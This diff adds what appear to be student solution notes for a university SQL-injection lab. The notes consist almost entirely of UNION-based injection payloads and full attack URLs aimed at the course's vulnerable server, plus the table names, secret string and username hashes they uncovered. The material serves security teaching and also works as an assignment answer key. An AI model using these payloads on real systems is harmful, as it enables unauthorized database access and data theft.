@@ -1,0 +1,51 @@
+DB_Name
+proj2_inject3
+db_version
+5.5.59-0ubuntu0.14.04.1
+table_name_1, 
+HINT, SECRET, foo, inject3_users 
+a_secret_string
+malleus
+
+Query:
+
+3' union SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' order by 1#
+3' union SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name != 'HINT' order by 1#
+3' union SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name != 'HINT' AND table_name != 'SECRET' order by 1#
+3' union SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name != 'HINT' AND table_name != 'SECRET' AND table_name != 'foo' order by 1#
+3' union SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name != 'HINT' AND table_name != 'SECRET' AND table_name != 'foo' AND table_name != 'inject3_users' order by 1#
+# find column name
+3' union SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name = 'foo' order by 1#
+Find another column name
+3' union SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name = 'foo' AND column_name != 'id' order by 1#
+3' union SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name = 'foo' AND column_name != 'id' AND column_name != 'message' order by 1#
+3' union SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name = 'SECRET' AND column_name != 'id' order by 1#
+3' union SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name = 'SECRET' AND column_name != 'id' AND column_name != 'hash' order by 1#
+3' union SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name = 'SECRET' AND column_name != 'id' AND column_name != 'hash' AND column_name != 'secret' order by 1#
+
+# Find column name for inject3_users
+3' union SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name = 'inject3_users' AND column_name != 'id' order by 1#
+3' union SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name = 'inject3_users' AND column_name != 'id' AND column_name != 'first_name' order by 1#
+3' union SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_name = 'inject3_users' AND column_name != 'id' AND column_name != 'first_name' AND column_name != 'hash_last' order by 1#
+
+
+# Find secret string
+md5('linhcao2') = 75d2766c9b39811c1a8bef4b8a7b2d26
+md5('ashishk3') = e3da3fc8667f0f05afb48befcef4e9ed
+3' union SELECT 1, message, 3, 4 from HINT order by 1#
+3' union SELECT 1, secret, 3, 4 from SECRET order by 1#
+3' union SELECT 1, secret, 3, hash from SECRET WHERE hash = '75d2766c9b39811c1a8bef4b8a7b2d26' order by 1#
+# for ashishk3
+3' union SELECT 1, secret, 3, hash from SECRET WHERE hash = 'e3da3fc8667f0f05afb48befcef4e9ed' order by 1#
+
+URL for prob 1
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=3%27+union+select+1%2C+2%2C+3%2C+schema%28%29+order+by+2+%23
+URL for prob 2
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=3%27+union+select+1%2C+2%2C+3%2C+%40%40version+order+by+4+%23
+URL for prob 3 Find table name
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=3%27+union+SELECT+1%2C+table_name%2C+3%2C+4+FROM+information_schema.tables+WHERE+table_schema+%21%3D+%27mysql%27+AND+table_schema+%21%3D+%27information_schema%27+order+by+1%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=3%27+union+SELECT+1%2C+table_name%2C+3%2C+4+FROM+information_schema.tables+WHERE+table_schema+%21%3D+%27mysql%27+AND+table_schema+%21%3D+%27information_schema%27+AND+table_name+%21%3D+%27HINT%27+order+by+1%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=3%27+union+SELECT+1%2C+table_name%2C+3%2C+4+FROM+information_schema.tables+WHERE+table_schema+%21%3D+%27mysql%27+AND+table_schema+%21%3D+%27information_schema%27+AND+table_name+%21%3D+%27HINT%27+AND+table_name+%21%3D+%27SECRET%27+order+by+1%23
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=3%27+union+SELECT+1%2C+table_name%2C+3%2C+4+FROM+information_schema.tables+WHERE+table_schema+%21%3D+%27mysql%27+AND+table_schema+%21%3D+%27information_schema%27+AND+table_name+%21%3D+%27HINT%27+AND+table_name+%21%3D+%27SECRET%27+AND+table_name+%21%3D+%27foo%27+order+by+1%23
+URL for prob 4
+http://bungle-cs461.csl.illinois.edu/sqlinject3/?id=3%27+union+SELECT+1%2C+message%2C+3%2C+4+from+HINT+order+by+1%23
